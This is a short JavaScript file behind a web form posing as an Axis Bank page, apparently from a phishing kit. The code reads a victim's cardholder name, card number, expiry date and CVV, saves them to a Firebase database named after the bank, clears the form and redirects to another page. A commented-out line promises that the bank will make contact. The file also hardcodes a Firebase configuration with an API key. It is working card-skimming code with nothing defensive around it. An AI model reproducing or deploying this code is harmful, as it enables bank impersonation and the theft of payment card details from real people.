// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyAlhmjC2Kz5i6t5xfL9tFhT0P3M76vmRVg",
  authDomain: "axis-bank-47624.firebaseapp.com",
  databaseURL: "https://axis-bank-47624-default-rtdb.firebaseio.com",
  projectId: "axis-bank-47624",
  storageBucket: "axis-bank-47624.appspot.com",
  messagingSenderId: "310941887111",
  appId: "1:310941887111:web:e095ab99e1a8d84d936622",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var card_name = getInputVal('card_name');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(card_name, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="sad1.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(card_name, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    card_name: card_name,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
